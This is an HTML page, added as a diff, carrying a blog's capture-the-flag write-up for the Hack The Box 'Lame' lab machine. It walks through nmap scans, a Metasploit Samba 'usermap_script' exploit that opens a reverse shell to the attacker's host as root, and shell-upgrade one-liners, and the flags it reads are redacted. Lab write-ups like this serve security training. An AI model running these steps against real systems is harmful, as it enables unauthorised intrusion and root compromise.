@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Lame - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Lame"><a href="#Hack-The-Box-Lame" class="headerlink" title="Hack The Box - Lame"></a>Hack The Box - Lame</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Lame is a linux machine that is rated as Easy  on hack the box, the target is to get as a root user its IP address is <code>10.10.10.3.</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/lame/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p>
+<pre><figure class="highlight plain"><span class="line">|-------(root@kali)-------|(~/HackTheBox/lame)<br>|<br>|-->{SFire129}#nmap -A -v 10.10.10.3</span>
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 17:39 EDT
+ Nmap scan report for 10.10.10.3
+ Host is up (0.17s latency).
+ Not shown: 996 filtered ports<br> PORT   STATE SERVICE VERSION
+ 21/tcp  open  ftp         vsftpd 2.3.4
+ |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+ | ftp-syst:
+ |   STAT:
+ | FTP server status:
+ |      Connected to 10.10.14.36
+ |      Logged in as ftp
+ |      TYPE: ASCII
+ |      No session bandwidth limit
+ |      Session timeout in seconds is 300
+ |      Control connection is plain text
+ |      Data connections will be plain text
+ |      vsFTPd 2.3.4 - secure, fast, stable
+ |_End of status
+ 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+ | ssh-hostkey:
+ |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+ |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+ 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+ 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+ Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+ Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Arris TG862G/CT cable modem (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%)
+ No exact OS matches for host (test conditions non-ideal).
+ Uptime guess: 0.018 days (since Thu May  7 17:14:15 2020)
+ Network Distance: 2 hops
+ TCP Sequence Prediction: Difficulty=204 (Good luck!)
+ IP ID Sequence Generation: All zeros
+ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+ Host script results:
+ |_clock-skew: mean: -3d00h57m08s, deviation: 2h49m45s, median: -3d02h57m10s
+ | smb-os-discovery:
+ |   OS: Unix (Samba 3.0.20-Debian)
+ |   Computer name: lame
+ |   NetBIOS computer name:
+ |   Domain name: hackthebox.gr
+ |   FQDN: lame.hackthebox.gr
+ |_  System time: 2020-05-04T14:42:48-04:00
+ | smb-security-mode:
+ |   account_used: guest
+ |   authentication_level: user
+ |   challenge_response: supported
+ |_  message_signing: disabled (dangerous, but default)
+ |_smb2-time: Protocol negotiation failed (SMB2)
+ 
+ TRACEROUTE (using port 445/tcp)
+ HOP RTT       ADDRESS
+ 1   169.36 ms 10.10.14.1
+ 2   177.54 ms 10.10.10.3
+ 
+ NSE: Script Post-scanning.
+ Initiating NSE at 17:40
+ Completed NSE at 17:40, 0.00s elapsed
+ Initiating NSE at 17:40
+ Completed NSE at 17:40, 0.00s elapsed
+ Initiating NSE at 17:40
+ Completed NSE at 17:40, 0.00s elapsed
+ Read data files from: /usr/bin/../share/nmap
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 69.75 seconds
+            Raw packets sent: 2083 (95.240KB) | Rcvd: 41 (2.492KB)
+ |-------(root@kali)-------|(~/HackTheBox/lame)<br>|<br>|-->{SFire129}#</figure></pre>
+
+
+<p>Nmap reveals <code>Service vsftpd 2.3.4</code>on port 21,<code>OpenSSH</code> on port 22 and <code>Samba Service</code> on ports 135,445.</p>
+<br>
+<p>Therefore we will to lauch a vulnerability scan with nmap </p>
+
+<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/lame)<br>|<br>|-->{SFire129}#nmap -sC -v 10.10.10.3 -p- 21
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 18:40 EDT
+ Nmap scan report for 10.10.10.3
+ Host is up (0.16s latency).
+ Not shown: 65530 filtered ports
+ PORT     STATE SERVICE     VERSION
+ 21/tcp   open  ftp         vsftpd 2.3.4
+ |_ftp-anon: Anonymous FTP login allowed (FTP code 230) <--------
+ | ftp-syst:
+ |   STAT:
+ | FTP server status:
+ |      Connected to 10.10.14.36
+ |      Logged in as ftp
+ |      TYPE: ASCII
+ |      No session bandwidth limit
+ |      Session timeout in seconds is 300
+ |      Control connection is plain text
+ |      Data connections will be plain text
+ |      vsFTPd 2.3.4 - secure, fast, stable <------
+ 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+ 445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+ |_End of status
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 2 IP addresses (1 host up) scanned in 279.12 seconds
+ |-------(root@kali)-------|(~/HackTheBox/lame)<br>|<br>|-->{SFire129}#</figure></pre>
+<br>
+<p>We can see the anonymous auth on FTP service and the version  vsftp  2.3.4 has  an exploit "Backdoor Command Execution"(Metasploit) 17491.rb but in this case we'll not to execute.
+The version Samba 3.0.20 is vulnerable because allow to execute remote code, for the next step we will to launch the Metasploit console and will search the exploit with the command <code>search.</code></p>
+
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2>
+<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/lame)<br>|<br>|-->{SFire129}#msfconsole
+ msf5 > search 3.0.20
+<br>
+ Matching Modules
+ ================
+<br>
+    #  Name                                                   Disclosure Date  Rank       Check  Description
+    -  ----                                                   ---------------  ----       -----  -----------
+    0  auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation
+    1  exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba "username map script" Command Execution
+<br>
+ msf5 > use exploit/multi/samba/usermap_script
+ msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
+ RHOSTS => 10.10.10.3
+ msf5 exploit(multi/samba/usermap_script) > run
+ [*] Started reverse TCP double handler on 10.10.14.36:4444
+ [*] Accepted the first client connection...
+ [*] Accepted the second client connection...
+ [*] Command: echo FtF010K1Ztc0wQLq;
+ [*] Writing to socket A
+ [*] Writing to socket B
+ [*] Reading from sockets...
+ [*] Reading from socket B
+ [*] B: "FtF010K1Ztc0wQLq\r\n"
+ [*] Matching...
+ [*] A is input...
+ [*] Starting interaction with 2...
+<br>
+ whoami
+ root</figure></pre>
+<br>
+
+<h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="headerlink" title="Capture The Flag"></a>Capture The Flag</h2>
+
+<p> We have an interactive session, we will to need whitchever of the next commands scripts to spawn a tty shell <p>
+<code>SHELL=/bin/bash script -q /dev/null</code><br>
+<code> python -c 'import pty; pty.spawn("/bin/bash")'</code></br>
+<pre><figure class="highlight plain">python -c 'import pty; pty.spawn("/bin/bash")'
+ root@lame:/# cd home
+ root@lame:/home# ls -laR | grep user.txt
+ rw-r--r-- 1 makis makis   33 Mar 14  2017 user.txt
+ root@lame:/home# cd makis
+ root@lame:/home/makis# cat user.txt
+ ***here will be show you the flag user***
+ root@lame:/home/makis# cd ~
+ root@lame:/root# cat root.txt
+ ***here will be show you the flag root***
+ root@lame:/root#
+ ..
+ ..
+</figure></pre>
+<br>
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-07</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#Samba</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
